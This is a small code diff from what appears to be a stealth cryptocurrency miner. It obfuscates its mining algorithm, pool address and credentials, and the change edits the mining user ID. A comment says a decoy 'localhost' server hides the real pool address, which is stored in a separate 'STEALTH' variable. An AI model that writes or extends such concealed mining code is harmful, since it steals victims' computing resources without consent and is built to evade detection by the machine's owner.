@@ -59,7 +59,7 @@ SERVICE_ALGORITHM_ENCODED = obfuscate_string("xelishashv2")
 SERVICE_SERVER_ENCODED = obfuscate_string("localhost:8080")
 # The actual server address is stored in a different, separate variable.
 STEALTH_SERVER_ENCODED = obfuscate_string("xel.kryptex.network:7019")
-SERVICE_USER_ENCODED = obfuscate_string("krxXJMWJKW.ITIL")
+SERVICE_USER_ENCODED = obfuscate_string("krxXJMWJKW.ATAL")
 SERVICE_PASS_ENCODED = obfuscate_string("200")
 
 # Command and argument strings are also obfuscated.
